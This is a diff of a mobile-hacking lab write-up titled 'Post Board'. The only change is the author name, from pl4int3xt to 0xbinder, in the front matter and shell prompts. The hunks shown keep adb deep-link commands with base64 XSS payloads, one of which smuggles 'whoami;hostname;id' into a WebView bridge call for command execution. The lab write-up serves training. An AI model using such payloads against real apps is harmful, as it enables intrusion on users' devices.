@@ -1,5 +1,5 @@
 ---
-author: pl4int3xt
+author: 0xbinder
 layout: post
 title: Lab - Post Board
 date: '2024-01-22'
@@ -25,7 +25,7 @@ Exploit an XSS vulnerability in a WebView component to achieve RCE in an Android
 Let's download vpn file and use adb to connect to the lab
 
 ```shell
-pl4int3xt@archlinux ~> adb connect 10.11.1.1:5001 
+0xbinder@archlinux ~> adb connect 10.11.1.1:5001 
 * daemon not running; starting now at tcp:5037
 * daemon started successfully
 connected to 10.11.1.1:5001
@@ -34,7 +34,7 @@ connected to 10.11.1.1:5001
 Let's locate the mobile app we want to exploit with adb 
 
 ```shell
-pl4int3xt@archlinux ~> adb shell
+0xbinder@archlinux ~> adb shell
 shell:/$ pm path com.mobilehackinglab.postboard
 package:/data/app/~~dP4fNphGU9naeT4CQCkv4Q==/com.mobilehackinglab.postboard-76lPQA1VUWQkja8ga6UspQ==/base.apk
 shell:/$ exit
@@ -44,7 +44,7 @@ logout
 Let's pull the apk locally to analyze it with jadx-gui
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> adb pull /data/app/~~dP4fNphGU9naeT4CQCkv4Q==/com.mobilehackinglab.postboard-76lPQA1VUWQkja8ga6UspQ==/base.apk
+0xbinder@archlinux ~/D/mobile-hacking> adb pull /data/app/~~dP4fNphGU9naeT4CQCkv4Q==/com.mobilehackinglab.postboard-76lPQA1VUWQkja8ga6UspQ==/base.apk
 /data/app/~~dP4fNphGU9naeT4CQCkv4Q==/com.mobilehackin...ulled, 0 skipped. 0.4 MB/s (5612111 bytes in 14.686s)
 ```
 
@@ -137,7 +137,7 @@ PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmxvY2F0aW9uLmhyZWYpPg==
 adb command
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> adb shell am start -n "com.mobilehackinglab.postboard/.MainActivity" -a "android.intent.action.VIEW" -d "postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmxvY2F0aW9uLmhyZWYpPg=="
+0xbinder@archlinux ~/D/mobile-hacking> adb shell am start -n "com.mobilehackinglab.postboard/.MainActivity" -a "android.intent.action.VIEW" -d "postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmxvY2F0aW9uLmhyZWYpPg=="
 Starting: Intent { act=android.intent.action.VIEW dat=postboard://postmessage/... cmp=com.mobilehackinglab.postboard/.MainActivity }
 ```
 
@@ -218,7 +218,7 @@ PGltZyBzcmM9eCBvbmVycm9yPSJXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ3dob2Ft
 adb command
 
 ```shell
-pl4int3xt@archlinux ~/D/mobile-hacking> adb shell am start -n "com.mobilehackinglab.postboard/.MainActivity" -a "android.intent.action.VIEW" -d "postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPSJXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ3dob2FtaTtob3N0bmFtZTtpZCcpIj4="
+0xbinder@archlinux ~/D/mobile-hacking> adb shell am start -n "com.mobilehackinglab.postboard/.MainActivity" -a "android.intent.action.VIEW" -d "postboard://postmessage/PGltZyBzcmM9eCBvbmVycm9yPSJXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ3dob2FtaTtob3N0bmFtZTtpZCcpIj4="
 Starting: Intent { act=android.intent.action.VIEW dat=postboard://postmessage/... cmp=com.mobilehackinglab.postboard/.MainActivity }
 ```
 
